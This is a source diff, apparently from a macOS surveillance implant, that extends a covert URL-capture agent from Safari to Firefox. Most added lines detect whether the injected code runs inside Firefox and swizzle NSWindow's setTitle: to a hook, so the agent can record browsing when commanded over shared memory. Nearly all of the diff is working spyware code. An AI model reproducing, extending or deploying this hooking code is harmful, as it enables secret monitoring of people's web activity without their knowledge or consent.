@@ -32,7 +32,6 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
-
 #define swizzleMethod(c1, m1, c2, m2) do { \
           method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
                                          class_getInstanceMethod(c2, m2)); \
@@ -566,7 +565,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   NSMutableData *readData;
   shMemoryCommand *shMemCommand;
   NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
-
+  
   readData = [mSharedMemoryCommand readMemory: offset
                                 fromComponent: COMP_AGENT];
   shMemCommand = (shMemoryCommand *)[readData bytes];
@@ -580,7 +579,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             if (urlFlag == 0
                 && shMemCommand->command == AG_START)
               {
-                if ([identifier isCaseInsensitiveLike: @"com.apple.safari"])
+                if ([identifier isCaseInsensitiveLike: @"com.apple.safari"] ||
+                    [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
                   {
 #ifdef DEBUG_INPUT_MANAGER
                     infoLog(@"Starting Agent URL");
@@ -597,7 +597,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
             else if ((urlFlag == 1 || urlFlag == 2)
                       && shMemCommand->command == AG_STOP)
               {
-                if ([identifier isCaseInsensitiveLike: @"com.apple.safari"])
+                if ([identifier isCaseInsensitiveLike: @"com.apple.safari"] ||
+                    [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
                   {
 #ifdef DEBUG_INPUT_MANAGER
                     infoLog(@"Stopping Agent URL");
@@ -966,6 +967,37 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
               warnLog(@"URL - not the right application, skipping");
 #endif
             }
+
+          // End of Safari
+
+          //
+          // Firefox 3 - Massimo Chiodini
+          //
+          NSString *applicationName  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
+          NSString *firefoxAppName   = [[NSString alloc] initWithUTF8String: "Firefox.app"];
+          
+          NSComparisonResult result = [firefoxAppName compare: applicationName
+                                                      options: NSCaseInsensitiveSearch
+                                                        range: NSMakeRange(0, [applicationName length])
+                                                       locale: [NSLocale currentLocale]];
+  
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"Comparing %@ vs. %@ (%d)", applicationName, firefoxAppName, result);
+#endif
+          if (result == NSOrderedSame)
+            {
+#ifdef DEBUG_INPUT_MANAGER
+              infoLog(@"Hooking fairfocs baby!");
+#endif  
+              Class className = objc_getClass("NSWindow");
+              
+              swizzleMethod(className, @selector(setTitle:),
+                            className, @selector(setTitleHook:));
+              
+            }
+
+          // End of Firefox 3
+
         }
       else if (urlFlag == 3)
         {
@@ -989,6 +1021,35 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #ifdef DEBUG_INPUT_MANAGER
               warnLog(@"URL - not the right application, skipping");
 #endif
+            }
+        
+          // firefox 3
+
+          NSString *application_name  = [[[NSBundle mainBundle] bundlePath] lastPathComponent];
+          NSString *firefox_app       = [[NSString alloc] initWithUTF8String: "Firefox.app"];
+          
+          NSRange strRange;
+          strRange.location = 0;
+          strRange.length   = [application_name length];
+          
+          NSComparisonResult firefox_res = [firefox_app compare: application_name
+                                                        options: NSCaseInsensitiveSearch
+                                                          range: strRange
+                                                         locale: [NSLocale currentLocale]];
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"Comparing %@ vs. %@ (%d)", application_name, firefox_app, firefox_res);
+#endif      
+          if(firefox_res == NSOrderedSame)
+            {
+#ifdef DEBUG_INPUT_MANAGER
+              infoLog(@"Hooking fairfocs baby!");
+#endif
+              
+              Class className = objc_getClass("NSWindow");
+              
+              swizzleMethod(className, @selector(setTitle:),
+                            className, @selector(setTitleHook:));
+              
             }
         }
       
